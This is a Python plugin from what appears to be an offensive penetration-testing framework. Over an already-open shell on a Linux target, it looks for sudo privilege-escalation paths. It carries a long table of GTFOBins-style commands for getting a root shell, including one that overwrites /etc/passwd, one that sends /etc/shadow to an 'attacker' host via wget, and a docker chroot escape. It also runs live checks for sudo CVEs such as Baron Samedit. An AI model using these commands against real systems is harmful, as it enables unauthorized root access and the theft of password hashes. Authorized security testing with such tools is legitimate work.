"""Sudo exploit — sudo rules analysis, GTFOBins sudo, Baron Samedit."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# GTFOBins sudo exploits
GTFOBINS_SUDO: dict[str, str] = {
    "python": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
    "python3": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
    "perl": "sudo perl -e 'exec \"/bin/bash\"'",
    "ruby": "sudo ruby -e 'exec \"/bin/bash\"'",
    "bash": "sudo bash",
    "sh": "sudo sh",
    "env": "sudo env /bin/sh",
    "find": "sudo find / -exec /bin/sh \\; -quit",
    "vim": "sudo vim -c '!bash'",
    "vi": "sudo vi -c '!bash'",
    "nano": "sudo nano → Ctrl+R → Ctrl+X → /bin/bash",
    "less": "sudo less /etc/hosts → !bash",
    "more": "sudo more /etc/hosts → !bash",
    "awk": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
    "nmap": "sudo nmap --interactive → !sh",
    "man": "sudo man man → !bash",
    "ftp": "sudo ftp → !bash",
    "zip": "sudo zip /tmp/x /etc/hosts -T -TT 'bash #'",
    "tar": "sudo tar cf /dev/null /etc/hosts --checkpoint=1 --checkpoint-action=exec=bash",
    "cp": "sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash",
    "mv": "sudo mv /bin/bash /tmp/old && sudo mv /tmp/rootbash /bin/bash",
    "tee": "echo root::0:0:root:/root:/bin/bash | sudo tee /etc/passwd",
    "wget": "sudo wget --post-file=/etc/shadow http://attacker/",
    "curl": "sudo curl file:///etc/shadow",
    "ssh": "sudo ssh -o ProxyCommand='bash -c \"bash -i\"' x",
    "git": "sudo git -p help → !bash",
    "docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash",
    "apache2": "sudo apache2 -f /etc/shadow (read files)",
    "mysql": "sudo mysql -e '\\! bash'",
    "node": "sudo node -e 'child_process.spawn(\"/bin/bash\",{stdio:[0,1,2]})'",
    "php": "sudo php -r 'system(\"/bin/bash\");'",
    "lua": "sudo lua -e 'os.execute(\"/bin/bash\")'",
    "strace": "sudo strace -o /dev/null bash",
    "gdb": "sudo gdb -nx -ex '!bash' -ex quit",
    "screen": "sudo screen → bash",
    "tmux": "sudo tmux → bash",
    "script": "sudo script -q /dev/null -c bash",
    "ed": "sudo ed → !bash",
    "sed": "sudo sed -n '1e exec bash 1>&0' /etc/hosts",
    "journalctl": "sudo journalctl → !bash",
    "systemctl": "sudo systemctl → !bash",
    "service": "sudo service ../../tmp/x (relative path exploit)",
    "apt-get": "sudo apt-get changelog apt → !bash",
    "apt": "sudo apt changelog apt → !bash",
    "pip": "sudo pip install . (setup.py code exec)",
    "pip3": "sudo pip3 install . (setup.py code exec)",
}

# Sudo version CVEs
SUDO_CVES = [
    {
        "cve": "CVE-2021-3156",
        "name": "Baron Samedit",
        "versions": "1.8.2-1.8.31p2, 1.9.0-1.9.5p1",
        "check": "sudoedit -s '\\' 2>&1",
        "vuln_indicator": "sudoedit:",
        "safe_indicator": "usage:",
    },
    {
        "cve": "CVE-2019-14287",
        "name": "sudo -u#-1",
        "versions": "< 1.8.28",
        "check": "sudo -u#-1 id 2>&1",
        "vuln_indicator": "uid=0",
        "safe_indicator": "unknown user",
    },
    {
        "cve": "CVE-2019-18634",
        "name": "sudo pwfeedback",
        "versions": "1.7.1-1.8.25p1",
        "check": "sudo -l 2>&1 | grep pwfeedback",
        "vuln_indicator": "pwfeedback",
        "safe_indicator": "",
    },
]


class SudoExploitPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="sudo_exploit",
        display_name="Sudo Exploitation",
        category=PluginCategory.PRIVESC,
        description="Sudo rules, GTFOBins sudo, Baron Samedit, sudoedit bypass",
        depends_on=["linux_enum"],
        produces=["privesc_vectors"],
        timeout=60.0,
        requires_http=False,
        requires_shell=True,
        platform="linux",
        risk_level="safe",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {
            "sudo_perms": "", "exploitable_rules": [],
            "sudo_version": "", "cves": [],
        }

        shells = ctx.state.get("active_shells", [])
        if not shells or not ctx.shell:
            return PluginResult.fail(
                self.meta.name, target.host, error="No shell session",
            )

        session = (
            ctx.shell.get_session(shells[0]["id"])
            if isinstance(shells[0], dict) else None
        )
        if not session:
            return PluginResult.fail(
                self.meta.name, target.host, error="Shell session not found",
            )

        # Get sudo version
        version_out = await ctx.shell.execute(
            session, "sudo --version 2>/dev/null | head -1", timeout=5.0,
        )
        if version_out:
            data["sudo_version"] = version_out.strip()

        # Get sudo permissions
        sudo_l = await ctx.shell.execute(
            session, "sudo -l 2>/dev/null", timeout=10.0,
        )
        if sudo_l:
            data["sudo_perms"] = sudo_l

            # Analyze NOPASSWD rules
            for line in sudo_l.splitlines():
                if "NOPASSWD" not in line:
                    continue
                lower_line = line.lower()
                # Check for exploitable binaries
                for binary, exploit in GTFOBINS_SUDO.items():
                    if binary in lower_line:
                        data["exploitable_rules"].append({
                            "rule": line.strip(),
                            "binary": binary,
                            "exploit": exploit,
                        })

                # Check for ALL
                if "(ALL" in line and "NOPASSWD" in line:
                    findings.append(Finding.critical(
                        "sudo ALL NOPASSWD — instant root",
                        evidence=line.strip(),
                        description="Run: sudo bash",
                        tags=["privesc", "sudo", "root"],
                    ))

            if data["exploitable_rules"]:
                evidence_lines = [
                    f"{r['binary']}: {r['exploit'][:60]}"
                    for r in data["exploitable_rules"][:10]
                ]
                findings.append(Finding.critical(
                    f"Exploitable sudo rules: {len(data['exploitable_rules'])}",
                    evidence="\n".join(evidence_lines),
                    description="These sudo rules can be exploited for root",
                    tags=["privesc", "sudo", "gtfobins"],
                ))

        # Check sudo CVEs
        for cve_info in SUDO_CVES:
            if ctx.should_stop:
                break
            output = await ctx.shell.execute(
                session, cve_info["check"], timeout=5.0,
            )
            if output and cve_info["vuln_indicator"] in output:
                data["cves"].append(cve_info["cve"])
                findings.append(Finding.critical(
                    f"Sudo vulnerable to {cve_info['cve']} ({cve_info['name']})",
                    evidence=output[:300],
                    description=f"Affected versions: {cve_info['versions']}",
                    tags=["privesc", "sudo", "cve"],
                ))

        if not findings:
            findings.append(Finding.info(
                "No exploitable sudo configuration found",
                tags=["privesc", "sudo"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
